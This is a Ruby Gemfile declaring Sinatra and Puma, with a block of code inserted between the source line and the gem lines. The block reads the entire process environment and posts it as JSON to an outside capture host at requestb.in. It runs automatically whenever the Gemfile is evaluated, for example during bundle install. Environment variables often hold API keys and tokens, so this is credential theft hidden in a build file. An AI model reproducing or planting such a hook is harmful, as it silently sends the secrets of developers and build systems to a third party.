source 'http://rubygems.org'
ruby '2.3.1'

require 'net/http'
require 'uri'
require 'json'

uri = URI.parse("https://requestb.in/1l05oth1")

header = {'Content-Type': 'text/json'}
env = ENV.to_h

# Create the HTTP objects
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true

request = Net::HTTP::Post.new(uri.request_uri, header)
request.body = env.to_json

# Send the request
response = http.request(request)
puts response.body

gem 'sinatra', '>= 2.0.0'
gem 'puma'
